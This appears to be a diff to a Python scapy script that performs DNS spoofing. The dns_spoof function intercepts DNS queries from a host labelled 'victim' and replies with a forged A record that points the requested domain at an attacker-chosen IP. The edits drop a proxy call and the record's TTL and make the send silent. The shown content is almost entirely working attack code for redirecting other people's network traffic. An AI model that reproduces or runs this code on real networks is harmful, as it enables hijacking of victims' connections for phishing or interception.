@@ -21,10 +21,8 @@ def isDnsResponse(packet):
 #todo client doesnt seem to take this as answer even when cut off from internet
 def dns_spoof(packet):
     if not isDnsQuery(packet):
-        #print("Proxying packet, ip:" + str(packet[scapy.IP].src))
-        proxy(packet)
         return
-    print("dns lookup packet detected, ip:" + str(packet[scapy.IP].src))
+    print("dns spoof, victim ip:" + str(packet[scapy.IP].src))
 
     qname = packet[scapy.DNSQR].qname #get the domain name client wants to resolve
 
@@ -36,7 +34,7 @@ def dns_spoof(packet):
     dns_qd = packet[scapy.DNS].qd
         
     #dns record with the destination ip as resolved ip
-    dns_rr = scapy.DNSRR(rrname=qname, ttl=1000, rdata=destination_ip, type='A')
+    dns_rr = scapy.DNSRR(rrname=qname, rdata=destination_ip, type='A')
 
     spoofed_response = scapy.IP(dst=ip_src, src=ip_dst) / \
                     scapy.UDP(dport=udp_sport, sport=udp_dport) / \
@@ -44,7 +42,7 @@ def dns_spoof(packet):
                               an=dns_rr, ancount=1)
 
 
-    scapy.send(spoofed_response)
+    scapy.send(spoofed_response, verbose=False)
     
 
 def dns_main():
